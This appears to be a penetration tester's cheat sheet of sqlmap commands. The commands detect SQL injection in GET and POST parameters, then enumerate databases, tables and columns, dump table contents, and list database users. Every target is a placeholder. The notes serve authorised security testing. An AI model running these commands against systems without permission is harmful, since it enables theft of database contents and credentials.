### Source
https://github.com/sqlmapproject/sqlmap  

### Scan GET parameter, -u URL, -p parameter
```
sqlmap -u http://<domain>/<path>.php?<var>=1 -p <var>
```

### Scan POST parameter (save Burp Request to file), -r read file
```
sqlmap -r <file> -p <var>
```

### Or mark *var* within burp request before pasting to file
```
sqlmap -r <file>
```

### Once you found a SQL injection - get the database names
```
sqlmap -r <file> -p <var> --dbs
```

### Get the tables of a database, -D database
```
sqlmap -r <file> -p <var> --tables -D <database>
```

### Get the columns of a specific table, -T table
```
sqlmap -r <file> -p <var> --columns -D <database> -T <table>
```

### Get the content of the columns
```
sqlmap -r <file> -p <var> --dump -D <database> -T <table>
```

### Get database system users
```
sqlmap -r <file> -p <var> --users
```

### Get current database system user
```
sqlmap -r <file> -p <var> --current-user
```

